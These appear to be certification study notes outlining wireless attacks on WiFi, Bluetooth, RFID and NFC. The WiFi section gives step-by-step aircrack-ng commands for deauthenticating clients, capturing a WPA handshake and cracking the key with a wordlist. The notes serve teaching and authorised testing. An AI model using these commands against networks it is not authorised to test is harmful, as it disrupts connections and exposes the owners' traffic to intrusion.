Wireless Attacks
Objectives:

    List and describe common wireless-based attacks and attack tools

    General Attacks
        Jamming
        Spoofing
        Data Corruption/Modification

    WiFi

        aircrack-ng
            sudo airmon-ng start wlan0
            sudo airodump-ng wlan0mon
                Record the BSSID if the target device
            sudo airodump-ng -c 6 --bssid <Target_MAC> -w psk wlan0mon
                This will show connected clients MAC addresses

        Deauthentication
            sudo aireplay-ng --deauth 25 -h <Client_to_deauth_MAC> -a 00:1C:DF:89:84:9F wlan0mon

        Capture Handshakes
            Put wireless card into monitoring mode
                airmon-ng -start wlan0
            Find BSSID of target AP
                airodump-ng wlan0mon
                Record BSSID and channel of Target AP
            Monitor target AP
                airodump-ng -c 6 --bssid 00:1C:DF:89:84:9F -w ceh.cap wlan0mon
                    -c = channel number
                    -w = write out file location
            Wait for 4-way handshake or force with aireplay-ng
                Force 4-way handshake
                    aireplay-ng -0 2 -a 00:1C:DF:89:84:9F -c <clientMAC> wlan0mon
                        Check the airodump-ng capture for 4-way handshake
            Time to crack the WPA key
                aircrack-ng -a2 -b 00:1C:DF:89:84:9F -w ~/Documents/rockyou.txt *.cap
                    Record the cracked PSK

        WPS

        Evil Twin
            Eavesdropping
            MitM (on-path)

    Bluetooth
        BlueJacking
            Sending messages to devices using Contacts
                Attacker creates a new contact
                    Instead of name/number, attacker saves a message in those areas
                Scan for Bluetooth devices
                Shares the contact
                Target receives the message/contact with no knowledge of who sent it
        BlueSnarfing
            Attacker is able to connect to victim without auth to see contacts, email, calendars, text messages, pictures, etc
        Bluetooth Low Energy(BLE) Attack
            Flaws in BLE security allows for
                Spoofing attacks
                Man-in-the-Middle attacks

    RFID Cloning
        https://proxmark.com

    Amplification Attacks (NFC)
        Based off of RFID
            Can be cloned
            Transmissions can be eavesdropped at up to 10meters with help from antenna
            Signal can be jammed
            Signal can be modified
                Corrupted
                Inserted
                MITM
                    No encryption
